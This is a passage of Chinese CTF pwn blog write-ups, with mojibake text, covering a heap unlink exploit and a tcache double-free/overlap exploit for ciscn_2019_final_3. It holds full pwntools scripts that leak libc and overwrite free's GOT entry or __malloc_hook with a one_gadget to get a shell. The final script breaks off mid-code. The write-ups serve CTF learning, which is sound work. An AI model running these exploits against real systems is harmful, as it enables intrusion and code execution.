title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h1><h2 id="æ„é€ unlink"><a href="#æ„é€ unlink" class="headerlink" title="æ„é€ unlink"></a>æ„é€ unlink</h2><ul><li>é¢˜ç›®æ²¡æœ‰å¼€å¯PIEï¼Œè‡ªç„¶æƒ³åˆ°äº†unlinkï¼Œç”±äºeditä¸­ä¼šmalloc(0xa0)çš„chunkï¼Œæˆ‘ä»¬æ„é€ å‡ºä¸€ä¸ª0xa0çš„free_chunkï¼Œåœ¨editçš„æ—¶å€™å°±ç›¸å½“äºæ˜¯è¦†å†™äº†ï¼Œå€ŸåŠ©è¿™ä¸ª0xa0çš„chunkè¿˜å¯ä»¥è¿›è¡Œunlink:</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">heaplist = <span class="number">0x00602120</span></span><br><span class="line">fd = heaplist - <span class="number">0x18</span></span><br><span class="line">bk = heaplist - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºä¸èƒ½editç›´æ¥æ”¹ï¼Œæ‰€ä»¥</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x00</span>,payload)</span><br><span class="line">bug()</span><br></pre></td></tr></table></figure></div><ul><li>0xa0 &#x3D; 0x80 + 0x20ï¼ˆ0x80æ˜¯å› ä¸ºæˆ‘ä»¬æ„é€ unlinkçš„fake_chunkæ˜¯ä»user_dataå¼€å§‹æ„é€ ï¼Œæ­¤å¤„ç›¸å½“äºoverlapping chunk0,chunk1ï¼‰</li><li>æ­£å¸¸åº”è¯¥æ˜¯æº¢å‡ºä¿®æ”¹chunk2çš„prev_sizeä¸º0xa0,ä»¥åŠsizeçš„inuse&#x3D;0ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰off_by_oneï¼Œä¹Ÿæ— æ³•ç›´æ¥æº¢å‡ºæ”¹ï¼Œäºæ˜¯ï¼Œæˆ‘ä»¬åˆ©ç”¨addé‡Œé¢çš„æ•´æ•°æº¢å‡ºè¿›è¡Œæ”¹å†™</li><li>free(chunk1)ï¼Œåªè¦å°†sizeèµ‹å€¼ä¸º0ï¼Œå°±å¯ä»¥æº¢å‡ºæ”¹å†™äº†ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240925201946698.bmp"></p><h2 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h2><ul><li>æ¥ä¸‹æ¥ç›´æ¥freeç›¸é‚»chunkï¼Œå³chunk2ï¼Œå°±å¯ä»¥è¾¾åˆ°unlinkçš„æ•ˆæœ</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20240925202348973.bmp"></p><ul><li>æ­¤æ—¶å°±æ˜¯æ­£å¸¸çš„unlinkçš„åˆ©ç”¨ï¼Œå¦‚ä¸‹ï¼š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;free_address : &quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu10_amd64.so&quot;</span>)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0xf02a4</span> <span class="comment"># 0xf02a4 0xf1147 0x4526a</span></span><br></pre></td></tr></table></figure></div><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ul><li>åœ¨åˆ†æeditå‡½æ•°çš„æ—¶å€™å°±è¯´äº†ï¼Œä¼šåœ¨æœ€åæ‰§è¡Œä¸€æ¬¡freeï¼Œæ‰€ä»¥ç›´æ¥edit chunk0ä¸ºOnegadgetç›¸å½“äºä¿®æ”¹free_got ä¸ºonegadget,å¹¶ä¸”åœ¨æœ€åä¼šæ‰§è¡Œfreeï¼Œå³onegadget,getshell</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ”¹free_got ä¸º onegadget</span></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget)) <span class="comment"># editæ”¹å®Œä¼šæ‰§è¡Œfree</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,27639)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2.append]&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;TheNewContents:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ä»¥æ‰“unlink</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh&quot;</span>) <span class="comment">#name</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;ddd&quot;</span>)</span><br><span class="line"></span><br><span class="line">heaplist = <span class="number">0x00602120</span></span><br><span class="line">fd = heaplist - <span class="number">0x18</span></span><br><span class="line">bk = heaplist - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”±äºä¸èƒ½editç›´æ¥æ”¹ï¼Œæ‰€ä»¥</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>) </span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x00</span>,payload)</span><br><span class="line">bug()</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">success(<span class="string">&quot;free_address : &quot;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu10_amd64.so&quot;</span>)</span><br><span class="line">base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">onegadget = base + <span class="number">0xf02a4</span> <span class="comment"># 0xf02a4 0xf1147 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”¹free_got ä¸º onegadget</span></span><br><span class="line">edit(<span class="number">0</span>,p64(onegadget)) <span class="comment"># editæ”¹å®Œä¼šæ‰§è¡Œfree</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache_double_free_overlap</title>
      <link href="/2024/09/23/tcache-double-free-overlap/"/>
      <url>/2024/09/23/tcache-double-free-overlap/</url>
      
        <content type="html"><![CDATA[<h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h2><p><a class="link" href="https://buuoj.cn/challenges#ciscn_2019_final_3">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>overlap</strong>ï¼š<a class="link" href="https://blog.csdn.net/qq_41202237/article/details/108320408">å‚è€ƒæ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>é¢˜è§£å‚è€ƒæ–‡ç« ï¼š</strong><a class="link" href="https://blog.csdn.net/mcmuyanga/article/details/113995633">å‚è€ƒé¢˜è§£ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="idaé€Ÿè§ˆ"><a href="#idaé€Ÿè§ˆ" class="headerlink" title="idaé€Ÿè§ˆ"></a>idaé€Ÿè§ˆ</h1><ul><li>mainå‡½æ•°åªæœ‰addå’Œfreeå¯ä»¥ä½¿ç”¨</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setinit();</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;welcome to babyheap&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;choice &gt; &quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      remove();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li><strong>æ ¸å¿ƒå°±ä½äºç”»çº¢æ¡†çš„åœ°æ–¹ï¼Œç›¸å½“äºshowäº†ã€‚</strong></li></ul><p><img lazyload src="/images/loading.svg" data-src="/tcache-double-free-overlap/capture_20240923192321767.bmp"></p><h2 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h2><p><img lazyload src="/images/loading.svg" data-src="/tcache-double-free-overlap/capture_20240923192541167.bmp"></p><h1 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h1><ul><li>æ³„éœ²libcæ˜¯å¿…ä¸å¯å°‘çš„ï¼Œè¯¥é¢˜ç›®æœ‰tcacheï¼Œè¦freeæ‰0x410ä»¥ä¸Šçš„chunkæ‰å¯ä»¥è¿›å…¥åˆ°unsorted bin ä¸­ï¼Œä½†æ˜¯æ­¤é¢˜ç›®è§„å®šäº†åªèƒ½sizeåªèƒ½&lt;&#x3D;0x78ï¼Œäºæ˜¯æˆ‘ä»¬æƒ³åˆ°äº†overlappingä¿®æ”¹size</li><li>å…³äºoverlappingå¯ä»¥çœ‹å¼€å¤´çš„æ–‡ç« ï¼Œä¿®æ”¹å®Œsizeï¼Œfreeå³å¯è·å¾—main_arena+96åœ°å€ï¼Œå¾—åˆ°libcï¼Œè·å¾—onegadget</li><li>double free æ”¹malloc hookä¸ºonegadget,å†æ¬¡mallocå³å¯ï¼Œç›¸å½“äºè°ƒç”¨onegadget</li></ul><h1 id="EXPåˆ†æ"><a href="#EXPåˆ†æ" class="headerlink" title="EXPåˆ†æ"></a>EXPåˆ†æ</h1><h2 id="overlapping-æ³„éœ²libc"><a href="#overlapping-æ³„éœ²libc" class="headerlink" title="overlapping+æ³„éœ²libc"></a>overlapping+æ³„éœ²libc</h2><ul><li><strong>æƒ³è¦overlapping,å¾—å…ˆæ„é€ å‡º0x421çš„chunkå‡ºæ¥ï¼Œä¸€å¼€å§‹æ²¡æœ‰æ„é€ ï¼Œåé¢å†æ¬¡mallocçš„chunkå…¶å®æ˜¯åœ¨è¿™ä¸ªfree_chunké‡Œé¢çš„ï¼Œå†æ¬¡freeä¼šæŠ¥é”™ã€‚</strong></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x400 = 8*0x80</span></span><br><span class="line">heap = add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">b&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"><span class="comment"># ä»¥ä¸Šæ˜¯æ„é€ å‡º0x421çš„chunk</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x28</span>,<span class="string">b&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double freeä¿®æ”¹size</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># æ­¤æ—¶ tcache 5 &gt; 5</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>)) <span class="comment"># ä¿®æ”¹sizeä¸º0x421</span></span><br></pre></td></tr></table></figure></div><ul><li>è¿™é‡Œä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸­é—´ä¼šæ’ä¸€æ­¥tcacheï¼Œä»¥åå†å¡«ä¸Š</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># unsorted bin æ­¤æ—¶chunk0_addr -&gt; main_arena+96</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># tcache</span></span><br><span class="line">test = add(<span class="number">13</span>,<span class="number">0x78</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># åˆ‡å‰²unsorted bin</span></span><br><span class="line">success(<span class="string">&quot;test : &quot;</span>+<span class="built_in">hex</span>(test))</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) <span class="comment"># tcache</span></span><br><span class="line">main_arena = add(<span class="number">15</span>,<span class="number">0x18</span>,<span class="string">b&#x27;f&#x27;</span>) - <span class="number">96</span></span><br><span class="line">success(<span class="string">&quot;main_arena : &quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">base = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">onegadget += base</span><br></pre></td></tr></table></figure></div><h2 id="double-free-ä¿®æ”¹malloc-hook"><a href="#double-free-ä¿®æ”¹malloc-hook" class="headerlink" title="double free ä¿®æ”¹malloc_hook"></a>double free ä¿®æ”¹malloc_hook</h2><ul><li>ä¿®æ”¹malloc_hookä¸ºonegadgetï¼Œç„¶åå†æ¬¡mallocå°±å¯ä»¥getshell</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">18</span>,<span class="number">0x78</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># è°ƒç”¨onegadget</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25726</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the index&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;now you can write something&quot;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;gift :&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;input the 